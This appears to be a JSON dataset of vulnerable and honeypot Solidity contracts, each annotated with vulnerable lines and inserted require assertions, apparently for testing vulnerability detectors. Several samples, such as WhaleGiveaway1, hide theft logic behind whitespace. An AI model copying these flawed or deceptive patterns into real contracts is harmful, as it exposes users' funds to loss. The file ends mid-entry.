{
    "list_dos.sol": [
        [
            "/*\n * @source: https://etherscan.io/address/0xf45717552f12ef7cb65e95476f217ea008167ae3#code\n * @author: -\n * @vulnerable_at_lines: 46,48\n */\n\n//added pragma version\npragma solidity ^0.4.0;\n\ncontract Government {\n\n     // Global Variables\n     uint32 public lastCreditorPayedOut;\n     uint public lastTimeOfNewCredit;\n     uint public profitFromCrash;\n     address[] public creditorAddresses;\n     uint[] public creditorAmounts;\n     address public corruptElite;\n     mapping (address => uint) buddies;\n     uint constant TWELVE_HOURS = 43200;\n     uint8 public round;\n\n     function Government() {\n         // The corrupt elite establishes a new government\n         // this is the commitment of the corrupt Elite - everything that can not be saved from a crash\n         profitFromCrash = msg.value;\n         corruptElite = msg.sender;\n         lastTimeOfNewCredit = block.timestamp;\n     }\n\n     function lendGovernmentMoney(address buddy) returns (bool) {\n         uint amount = msg.value;\n         // check if the system already broke down. If for 12h no new creditor gives new credit to the system it will brake down.\n         // 12h are on average = 60*60*12/12.5 = 3456\n         if (lastTimeOfNewCredit + TWELVE_HOURS < block.timestamp) {\n             // Return money to sender\n             msg.sender.send(amount);\n             // Sends all contract money to the last creditor\n             creditorAddresses[creditorAddresses.length - 1].send(profitFromCrash);\n             corruptElite.send(this.balance);\n             // Reset contract state\n             lastCreditorPayedOut = 0;\n             lastTimeOfNewCredit = block.timestamp;\n             profitFromCrash = 0;\n\n             creditorAddresses = new address[](0);\n\n             creditorAmounts = new uint[](0);\n             round += 1;\n             return false;\n         }\n         else {\n             // the system needs to collect at least 1% of the profit from a crash to stay alive\n             if (amount >= 10 ** 18) {\n                 // the System has received fresh money, it will survive at leat 12h more\n                 lastTimeOfNewCredit = block.timestamp;\n                 // register the new creditor and his amount with 10% interest rate\n                 creditorAddresses.push(msg.sender);\n                 creditorAmounts.push(amount * 110 / 100);\n                 // now the money is distributed\n                 // first the corrupt elite grabs 5% - thieves!\n                 corruptElite.send(amount * 5/100);\n                 // 5% are going into the economy (they will increase the value for the person seeing the crash comming)\n                 if (profitFromCrash < 10000 * 10**18) {\n                     profitFromCrash += amount * 5/100;\n                 }\n                 // if you have a buddy in the government (and he is in the creditor list) he can get 5% of your credits.\n                 // Make a deal with him.\n                 if(buddies[buddy] >= amount) {\n                     buddy.send(amount * 5/100);\n                 }\n                 buddies[msg.sender] += amount * 110 / 100;\n                 // 90% of the money will be used to pay out old creditors\n                 if (creditorAmounts[lastCreditorPayedOut] <= address(this).balance - profitFromCrash) {\n                     creditorAddresses[lastCreditorPayedOut].send(creditorAmounts[lastCreditorPayedOut]);\n                     buddies[creditorAddresses[lastCreditorPayedOut]] -= creditorAmounts[lastCreditorPayedOut];\n                     lastCreditorPayedOut += 1;\n                 }\n                 return true;\n             }\n             else {\n                 msg.sender.send(amount);\n                 return false;\n             }\n         }\n     }\n\n     // fallback function\n     function() {\n         lendGovernmentMoney(0);\n     }\n\n     function totalDebt() returns (uint debt) {\n         for(uint i=lastCreditorPayedOut; i<creditorAmounts.length; i++){\n             debt += creditorAmounts[i];\n         }\n     }\n\n     function totalPayedOut() returns (uint payout) {\n         for(uint i=0; i<lastCreditorPayedOut; i++){\n             payout += creditorAmounts[i];\n         }\n     }\n\n     // better don't do it (unless you are the corrupt elite and you want to establish trust in the system)\n     function investInTheSystem() {\n         profitFromCrash += msg.value;\n     }\n\n     // From time to time the corrupt elite inherits it's power to the next generation\n     function inheritToNextGeneration(address nextGeneration) {\n         if (msg.sender == corruptElite) {\n             corruptElite = nextGeneration;\n         }\n     }\n\n     function getCreditorAddresses() returns (address[]) {\n         return creditorAddresses;\n     }\n\n     function getCreditorAmounts() returns (uint[]) {\n         return creditorAmounts;\n     }\n }",
            {
                "VL": [
                    45,
                    "require(false);"
                ],
                "pre": [
                    32,
                    "require(msg.sender!=buddy);"
                ],
                "post": [
                    86,
                    "require(false);"
                ]
            }
        ],
        [
            "/*\n * @source: https://etherscan.io/address/0xf45717552f12ef7cb65e95476f217ea008167ae3#code\n * @author: -\n * @vulnerable_at_lines: 46,48\n */\n\n//added pragma version\npragma solidity ^0.4.0;\n\ncontract Government {\n\n     // Global Variables\n     uint32 public lastCreditorPayedOut;\n     uint public lastTimeOfNewCredit;\n     uint public profitFromCrash;\n     address[] public creditorAddresses;\n     uint[] public creditorAmounts;\n     address public corruptElite;\n     mapping (address => uint) buddies;\n     uint constant TWELVE_HOURS = 43200;\n     uint8 public round;\n\n     function Government() {\n         // The corrupt elite establishes a new government\n         // this is the commitment of the corrupt Elite - everything that can not be saved from a crash\n         profitFromCrash = msg.value;\n         corruptElite = msg.sender;\n         lastTimeOfNewCredit = block.timestamp;\n     }\n\n     function lendGovernmentMoney(address buddy) returns (bool) {\n         uint amount = msg.value;\n         // check if the system already broke down. If for 12h no new creditor gives new credit to the system it will brake down.\n         // 12h are on average = 60*60*12/12.5 = 3456\n         if (lastTimeOfNewCredit + TWELVE_HOURS < block.timestamp) {\n             // Return money to sender\n             msg.sender.send(amount);\n             // Sends all contract money to the last creditor\n             creditorAddresses[creditorAddresses.length - 1].send(profitFromCrash);\n             corruptElite.send(this.balance);\n             // Reset contract state\n             lastCreditorPayedOut = 0;\n             lastTimeOfNewCredit = block.timestamp;\n             profitFromCrash = 0;\n\n             creditorAddresses = new address[](0);\n\n             creditorAmounts = new uint[](0);\n             round += 1;\n             return false;\n         }\n         else {\n             // the system needs to collect at least 1% of the profit from a crash to stay alive\n             if (amount >= 10 ** 18) {\n                 // the System has received fresh money, it will survive at leat 12h more\n                 lastTimeOfNewCredit = block.timestamp;\n                 // register the new creditor and his amount with 10% interest rate\n                 creditorAddresses.push(msg.sender);\n                 creditorAmounts.push(amount * 110 / 100);\n                 // now the money is distributed\n                 // first the corrupt elite grabs 5% - thieves!\n                 corruptElite.send(amount * 5/100);\n                 // 5% are going into the economy (they will increase the value for the person seeing the crash comming)\n                 if (profitFromCrash < 10000 * 10**18) {\n                     profitFromCrash += amount * 5/100;\n                 }\n                 // if you have a buddy in the government (and he is in the creditor list) he can get 5% of your credits.\n                 // Make a deal with him.\n                 if(buddies[buddy] >= amount) {\n                     buddy.send(amount * 5/100);\n                 }\n                 buddies[msg.sender] += amount * 110 / 100;\n                 // 90% of the money will be used to pay out old creditors\n                 if (creditorAmounts[lastCreditorPayedOut] <= address(this).balance - profitFromCrash) {\n                     creditorAddresses[lastCreditorPayedOut].send(creditorAmounts[lastCreditorPayedOut]);\n                     buddies[creditorAddresses[lastCreditorPayedOut]] -= creditorAmounts[lastCreditorPayedOut];\n                     lastCreditorPayedOut += 1;\n                 }\n                 return true;\n             }\n             else {\n                 msg.sender.send(amount);\n                 return false;\n             }\n         }\n     }\n\n     // fallback function\n     function() {\n         lendGovernmentMoney(0);\n     }\n\n     function totalDebt() returns (uint debt) {\n         for(uint i=lastCreditorPayedOut; i<creditorAmounts.length; i++){\n             debt += creditorAmounts[i];\n         }\n     }\n\n     function totalPayedOut() returns (uint payout) {\n         for(uint i=0; i<lastCreditorPayedOut; i++){\n             payout += creditorAmounts[i];\n         }\n     }\n\n     // better don't do it (unless you are the corrupt elite and you want to establish trust in the system)\n     function investInTheSystem() {\n         profitFromCrash += msg.value;\n     }\n\n     // From time to time the corrupt elite inherits it's power to the next generation\n     function inheritToNextGeneration(address nextGeneration) {\n         if (msg.sender == corruptElite) {\n             corruptElite = nextGeneration;\n         }\n     }\n\n     function getCreditorAddresses() returns (address[]) {\n         return creditorAddresses;\n     }\n\n     function getCreditorAmounts() returns (uint[]) {\n         return creditorAmounts;\n     }\n }",
            {
                "VL": [
                    47,
                    "require(false);"
                ],
                "pre": [
                    32,
                    "require(msg.sender!=buddy);"
                ],
                "post": [
                    86,
                    "require(false);"
                ]
            }
        ]
    ],
    "dos_address.sol": [
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/dos_gas_limit/dos_address.sol\n * @author: -\n * @vulnerable_at_lines: 16,17,18\n */\n\npragma solidity ^0.4.25;\n\ncontract DosGas {\n\n    address[] creditorAddresses;\n    bool win = false;\n\n    function emptyCreditors() public {\n\n        if(creditorAddresses.length>1500) {\n            creditorAddresses = new address[](0);\n            win = true;\n        }\n    }\n\n    function addCreditors() public returns (bool) {\n        for(uint i=0;i<350;i++) {\n          creditorAddresses.push(msg.sender);\n        }\n        return true;\n    }\n\n    function iWin() public view returns (bool) {\n        return win;\n    }\n\n    function numberCreditors() public view returns (uint) {\n        return creditorAddresses.length;\n    }\n}",
            {
                "VL": [
                    15,
                    "require(msg.sender==tx.origin);"
                ],
                "pre": [
                    15,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    20,
                    "require(win);"
                ]
            }
        ]
    ],
    "dos_number.sol": [
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/dos_gas_limit/dos_number.sol\n * @author: -\n * @vulnerable_at_lines: 18,19,20,21,22\n */\n\npragma solidity ^0.4.25;\n\ncontract DosNumber {\n\n    uint numElements = 0;\n    uint[] array;\n\n    function insertNnumbers(uint value,uint numbers) public {\n\n        // Gas DOS if number > 382 more or less, it depends on actual gas limit\n\n        for(uint i=0;i<numbers;i++) {\n            if(numElements == array.length) {\n                array.length += 1;\n            }\n            array[numElements++] = value;\n        }\n    }\n\n    function clear() public {\n        require(numElements>1500);\n        numElements = 0;\n    }\n\n    // Gas DOS clear\n    function clearDOS() public {\n\n        // number depends on actual gas limit\n        require(numElements>1500);\n        array = new uint[](0);\n        numElements = 0;\n    }\n\n    function getLengthArray() public view returns(uint) {\n        return numElements;\n    }\n\n    function getRealLengthArray() public view returns(uint) {\n        return array.length;\n    }\n}",
            {
                "VL": [
                    17,
                    "require(numbers<382);"
                ],
                "pre": [
                    15,
                    "require(numbers<=382);"
                ],
                "post": [
                    24,
                    "require(numElements<=1500);"
                ]
            }
        ]
    ],
    "dos_simple.sol": [
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/dos_gas_limit/dos_simple.sol\n * @author: -\n * @vulnerable_at_lines: 17,18\n */\n\n\npragma solidity ^0.4.25;\n\ncontract DosOneFunc {\n\n    address[] listAddresses;\n\n    function ifillArray() public returns (bool){\n        if(listAddresses.length<1500) {\n\n            for(uint i=0;i<350;i++) {\n                listAddresses.push(msg.sender);\n            }\n            return true;\n\n        } else {\n            listAddresses = new address[](0);\n            return false;\n        }\n    }\n}",
            {
                "VL": [
                    16,
                    "require(msg.sender==tx.origin);"
                ],
                "pre": [
                    15,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    26,
                    "require(false);"
                ]
            }
        ]
    ],
    "auction.sol": [
        [
            "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/denial_of_service/auction.sol\n * @author: -\n * @vulnerable_at_lines: 23\n */\n\npragma solidity ^0.4.15;\n\n//Auction susceptible to DoS attack\ncontract DosAuction {\n  address currentFrontrunner;\n  uint currentBid;\n\n  //Takes in bid, refunding the frontrunner if they are outbid\n  function bid() payable {\n    require(msg.value > currentBid);\n\n    //If the refund fails, the entire transaction reverts.\n    //Therefore a frontrunner who always fails will win\n    if (currentFrontrunner != 0) {\n      //E.g. if recipients fallback function is just revert()\n\n      require(currentFrontrunner.send(currentBid));\n    }\n\n    currentFrontrunner = msg.sender;\n    currentBid         = msg.value;\n  }\n}",
            {
                "VL": [
                    22,
                    "require(msg.sender.send(msg.value));"
                ],
                "pre": [
                    16,
                    "require(msg.sender!=currentFrontrunner);"
                ],
                "post": [
                    28,
                    "require(currentFrontrunner.send(currentBid));"
                ]
            }
        ]
    ],
    "send_loop.sol": [
        [
            "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-unexpected-revert\n * @author: ConsenSys Diligence\n* @vulnerable_at_lines: 24\n * Modified by Bernhard Mueller\n */\n\npragma solidity 0.4.24;\n\ncontract Refunder {\n    \naddress[] private refundAddresses;\nmapping (address => uint) public refunds;\n\n    constructor() {\n        refundAddresses.push(0x79B483371E87d664cd39491b5F06250165e4b184);\n        refundAddresses.push(0x79B483371E87d664cd39491b5F06250165e4b185);\n    }\n\n    // bad\n    function refundAll() public {\n        for(uint x; x < refundAddresses.length; x++) { // arbitrary length iteration based on how many addresses participated\n\n            require(refundAddresses[x].send(refunds[refundAddresses[x]])); // doubly bad, now a single failure on send will hold up all funds\n        }\n    }\n\n}",
            {
                "VL": [
                    23,
                    "require(refunds[refundAddresses[x]]>0);"
                ],
                "pre": [
                    22,
                    "require(msg.sender==0x79B483371E87d664cd39491b5F06250165e4b184);"
                ],
                "post": [
                    26,
                    "require(msg.sender.send(address(this).balance));"
                ]
            }
        ]
    ],
    "name_registrar.sol": [
        [
            "/*\n * @source: https://github.com/sigp/solidity-security-blog#storage-example\n * @vulnerable_at_lines: 21\n */\n// A Locked Name Registrar\n\npragma solidity ^0.4.15;\ncontract NameRegistrar {\n\n    bool public unlocked = false;  // registrar locked, no name updates\n\n    struct NameRecord { // map hashes to addresses\n        bytes32 name;\n        address mappedAddress;\n    }\n\n    mapping(address => NameRecord) public registeredNameRecord; // records who registered names\n    mapping(bytes32 => address) public resolve; // resolves hashes to addresses\n\n    function register(bytes32 _name, address _mappedAddress) public {\n        // set up the new NameRecord\n\n        NameRecord newRecord;\n        newRecord.name = _name;\n        newRecord.mappedAddress = _mappedAddress;\n\n        resolve[_name] = _mappedAddress;\n        registeredNameRecord[msg.sender] = newRecord;\n\n        require(unlocked); // only allow registrations if contract is unlocked\n    }\n}",
            {
                "VL": [
                    22,
                    "require(registeredNameRecord[msg.sender].name==0x0);"
                ],
                "pre": [
                    21,
                    "require(registeredNameRecord[msg.sender].name==0x0);"
                ],
                "post": [
                    31,
                    "require(false);"
                ]
            }
        ]
    ],
    "open_address_lottery.sol": [
        [
            "/*\n * @source: https://etherscan.io/address/0x741f1923974464efd0aa70e77800ba5d9ed18902#code\n * @vulnerable_at_lines: 91\n */\n\npragma solidity ^0.4.19;\n/*\n * This is a distributed lottery that chooses random addresses as lucky addresses. If these\n * participate, they get the jackpot: 7 times the price of their bet.\n * Of course one address can only win once. The owner regularly reseeds the secret\n * seed of the contract (based on which the lucky addresses are chosen), so if you did not win,\n * just wait for a reseed and try again!\n *\n * Jackpot chance:   1 in 8\n * Ticket price: Anything larger than (or equal to) 0.1 ETH\n * Jackpot size: 7 times the ticket price\n *\n * HOW TO PARTICIPATE: Just send any amount greater than (or equal to) 0.1 ETH to the contract's address\n * Keep in mind that your address can only win once\n *\n * If the contract doesn't have enough ETH to pay the jackpot, it sends the whole balance.\n\n https://www.reddit.com/r/ethdev/comments/7wp363/how_does_this_honeypot_work_it_seems_like_a/\n*/\n\ncontract OpenAddressLottery{\n    struct SeedComponents{\n        uint component1;\n        uint component2;\n        uint component3;\n        uint component4;\n    }\n    \n    address owner; //address of the owner\n    uint private secretSeed; //seed used to calculate number of an address\n    uint private lastReseed; //last reseed - used to automatically reseed the contract every 1000 blocks\n    uint LuckyNumber = 7; //if the number of an address equals 7, it wins\n        \n    mapping (address => bool) winner; //keeping track of addresses that have already won\n    \n    function OpenAddressLottery() {\n        owner = msg.sender;\n        reseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed\n    }\n    \n    function participate() payable {\n        if(msg.value<0.1 ether)\n            return; //verify ticket price\n        \n        // make sure he hasn't won already\n        require(winner[msg.sender] == false);\n        \n        if(luckyNumberOfAddress(msg.sender) == LuckyNumber){ //check if it equals 7\n            winner[msg.sender] = true; // every address can only win once\n            \n            uint win=msg.value*7; //win = 7 times the ticket price\n            \n            if(win>this.balance) //if the balance isnt sufficient...\n                win=this.balance; //...send everything we've got\n            msg.sender.transfer(win);\n        }\n        \n        if(block.number-lastReseed>1000) //reseed if needed\n            reseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed\n    }\n    \n    function luckyNumberOfAddress(address addr) constant returns(uint n){\n        // calculate the number of current address - 1 in 8 chance\n        n = uint(keccak256(uint(addr), secretSeed)[0]) % 8;\n    }\n    \n    function reseed(SeedComponents components) internal {\n        secretSeed = uint256(keccak256(\n            components.component1,\n            components.component2,\n            components.component3,\n            components.component4\n        )); //hash the incoming parameters and use the hash to (re)initialize the seed\n        lastReseed = block.number;\n    }\n    \n    function kill() {\n        require(msg.sender==owner);\n        \n        selfdestruct(msg.sender);\n    }\n    \n    function forceReseed() { //reseed initiated by the owner - for testing purposes\n        require(msg.sender==owner);\n\n        SeedComponents s;\n        s.component1 = uint(msg.sender);\n        s.component2 = uint256(block.blockhash(block.number - 1));\n        s.component3 = block.difficulty*(uint)(block.coinbase);\n        s.component4 = tx.gasprice * 7;\n        \n        reseed(s); //reseed\n    }\n    \n    function () payable { //if someone sends money without any function call, just assume he wanted to participate\n        if(msg.value>=0.1 ether && msg.sender!=owner) //owner can't participate, he can only fund the jackpot\n            participate();\n    }\n\n}",
            {
                "VL": [
                    90,
                    "require(block.number-lastReseed>1000);"
                ],
                "pre": [
                    89,
                    "require(msg.sender!=owner);"
                ],
                "post": [
                    98,
                    "require(false);"
                ]
            }
        ]
    ],
    "crypto_roulette.sol": [
        [
            "/*\n * @source: https://github.com/thec00n/smart-contract-honeypots/blob/master/CryptoRoulette.sol\n * @vulnerable_at_lines: 40,41,42\n */\npragma solidity ^0.4.19;\n\n// CryptoRoulette\n//\n// Guess the number secretly stored in the blockchain and win the whole contract balance!\n// A new number is randomly chosen after each try.\n// https://www.reddit.com/r/ethdev/comments/7wp363/how_does_this_honeypot_work_it_seems_like_a/\n// To play, call the play() method with the guessed number (1-20).  Bet price: 0.1 ether\n\ncontract CryptoRoulette {\n\n    uint256 private secretNumber;\n    uint256 public lastPlayed;\n    uint256 public betPrice = 0.1 ether;\n    address public ownerAddr;\n\n    struct Game {\n        address player;\n        uint256 number;\n    }\n    Game[] public gamesPlayed;\n\n    function CryptoRoulette() public {\n        ownerAddr = msg.sender;\n        shuffle();\n    }\n\n    function shuffle() internal {\n        // randomly set secretNumber with a value between 1 and 20\n        secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 20 + 1;\n    }\n\n    function play(uint256 number) payable public {\n        require(msg.value >= betPrice && number <= 10);\n\n        Game game; //Uninitialized storage pointer\n        game.player = msg.sender;\n        game.number = number;\n        gamesPlayed.push(game);\n\n        if (number == secretNumber) {\n            // win!\n            msg.sender.transfer(this.balance);\n        }\n\n        shuffle();\n        lastPlayed = now;\n    }\n\n    function kill() public {\n        if (msg.sender == ownerAddr && now > lastPlayed + 1 days) {\n            suicide(msg.sender);\n        }\n    }\n\n    function() public payable { }\n}",
            {
                "VL": [
                    39,
                    "require(number>=1);"
                ],
                "pre": [
                    38,
                    "require(number>0);"
                ],
                "post": [
                    52,
                    "require(number<=10);"
                ]
            }
        ]
    ],
    "short_address_example.sol": [
        [
            "/*\n * @source: https://ericrafaloff.com/analyzing-the-erc20-short-address-attack/\n * @author: -\n * @vulnerable_at_lines: 18\n */\n\n pragma solidity ^0.4.11;\n\n contract MyToken {\n     mapping (address => uint) balances;\n\n     event Transfer(address indexed _from, address indexed _to, uint256 _value);\n\n     function MyToken() {\n         balances[tx.origin] = 10000;\n     }\n\n     function sendCoin(address to, uint amount) returns(bool sufficient) {\n         if (balances[msg.sender] < amount) return false;\n         balances[msg.sender] -= amount;\n         balances[to] += amount;\n         Transfer(msg.sender, to, amount);\n         return true;\n     }\n\n     function getBalance(address addr) constant returns(uint) {\n         return balances[addr];\n     }\n }",
            {
                "VL": [
                    17,
                    "require(msg.sender==tx.origin);"
                ],
                "pre": [
                    10,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    29,
                    "require(msg.sender==tx.origin);"
                ]
            }
        ]
    ],
    "lotto.sol": [
        [
            "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 20,27\n */\n\n pragma solidity ^0.4.18;\n \n contract Lotto {\n\n     bool public payedOut = false;\n     address public winner;\n     uint public winAmount;\n\n     // ... extra functionality here\n\n     function sendToWinner() public {\n         require(!payedOut);\n\n         winner.send(winAmount);\n         payedOut = true;\n     }\n\n     function withdrawLeftOver() public {\n         require(payedOut);\n\n         msg.sender.send(this.balance);\n     }\n }",
            {
                "VL": [
                    19,
                    "require(msg.sender==winner);"
                ],
                "pre": [
                    18,
                    "require(msg.sender==winner);"
                ],
                "post": [
                    22,
                    "require(msg.sender==winner);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 20,27\n */\n\n pragma solidity ^0.4.18;\n \n contract Lotto {\n\n     bool public payedOut = false;\n     address public winner;\n     uint public winAmount;\n\n     // ... extra functionality here\n\n     function sendToWinner() public {\n         require(!payedOut);\n\n         winner.send(winAmount);\n         payedOut = true;\n     }\n\n     function withdrawLeftOver() public {\n         require(payedOut);\n\n         msg.sender.send(this.balance);\n     }\n }",
            {
                "VL": [
                    26,
                    "require(msg.sender==winner);"
                ],
                "pre": [
                    25,
                    "require(msg.sender==winner);"
                ],
                "post": [
                    28,
                    "require(false);"
                ]
            }
        ]
    ],
    "0xb37f18af15bafb869a065b61fc83cfc44ed9cc27.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 33\n */\n\npragma solidity ^0.4.24;\n\n\ncontract SimpleWallet {\n    address public owner = msg.sender;\n    uint public depositsCount;\n    \n    modifier onlyOwner {\n        require(msg.sender == owner);\n        _;\n    }\n    \n    function() public payable {\n        depositsCount++;\n    }\n    \n    function withdrawAll() public onlyOwner {\n        withdraw(address(this).balance);\n    }\n    \n    function withdraw(uint _value) public onlyOwner {\n        msg.sender.transfer(_value);\n    }\n    \n    function sendMoney(address _target, uint _value) public onlyOwner {\n\n        _target.call.value(_value)();\n    }\n}",
            {
                "VL": [
                    32,
                    "require(_target.send(_value));"
                ],
                "pre": [
                    32,
                    "require(_target.send(_value));"
                ],
                "post": [
                    34,
                    "require(_target.balance>=_value);"
                ]
            }
        ]
    ],
    "0x7a4349a749e59a5736efb7826ee3496a2dfd5489.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway1\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);\n    }\n}",
            {
                "VL": [
                    43,
                    "require(msg.value>0);"
                ],
                "pre": [
                    42,
                    "require(msg.value>0);"
                ],
                "post": [
                    45,
                    "require(adr.balance>=msg.value);"
                ]
            }
        ]
    ],
    "0x524960d55174d912768678d8c606b4d50b79d7b1.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 21\n */\n\npragma solidity ^0.4.13;\n\ncontract Centra4 {\n\n\tfunction transfer() returns (bool) {\t\n\t\taddress contract_address;\n\t\tcontract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;\n\t\taddress c1;\t\t\n\t\taddress c2;\n\t\tuint256 k;\n\t\tk = 1;\n\t\t\n\t\tc2 = 0xaa27f8c1160886aacba64b2319d8d5469ef2af79;\t\n\n\t\tcontract_address.call(\"register\", \"CentraToken\");\n\t\tif(!contract_address.call(bytes4(keccak256(\"transfer(address,uint256)\")),c2,k)) return false;\n\n\t\treturn true;\n\t}\n\n}",
            {
                "VL": [
                    20,
                    "require(c2!=0x0);"
                ],
                "pre": [
                    12,
                    "require(msg.sender==0x96a65609a7b84e8842732deb08f56c3e21ac6f8a);"
                ],
                "post": [
                    25,
                    "require(false);"
                ]
            }
        ]
    ],
    "0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.24;\n\ncontract Proxy  {\n    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;\n    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } \n    function proxy(address target, bytes data) public payable {\n\n        target.call.value(msg.value)(data);\n    }\n}\n\ncontract DepositProxy is Proxy {\n    address public Owner;\n    mapping (address => uint256) public Deposits;\n\n    function () public payable { }\n    \n    function Vault() public payable {\n        if (msg.sender == tx.origin) {\n            Owner = msg.sender;\n            deposit();\n        }\n    }\n    \n    function deposit() public payable {\n        if (msg.value > 0.5 ether) {\n            Deposits[msg.sender] += msg.value;\n        }\n    }\n    \n    function withdraw(uint256 amount) public onlyOwner {\n        if (amount>0 && Deposits[msg.sender]>=amount) {\n            msg.sender.transfer(amount);\n        }\n    }\n}",
            {
                "VL": [
                    13,
                    "require(msg.sender==tx.origin);"
                ],
                "pre": [
                    13,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    15,
                    "require(target.call.value(msg.value)(data));"
                ]
            }
        ]
    ],
    "0x39cfd754c85023648bf003bea2dd498c5612abfa.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44,97\n */\n\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_addr]>=_wei)\n            {\n\n                _addr.call.value(_wei);\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n    \n \n}",
            {
                "VL": [
                    43,
                    "require(token.call(bytes4(sha3(\"balanceOf(address)\")),(address)this)>=amount));"
                ],
                "pre": [
                    43,
                    "require(token.call(bytes4(sha3(\"balanceOf(address)\")),(address)this)>=amount));"
                ],
                "post": [
                    45,
                    "require(token.call(bytes4(sha3(\"balanceOf(address)\")),to)>0);"
                ]
            }
        ],
        [
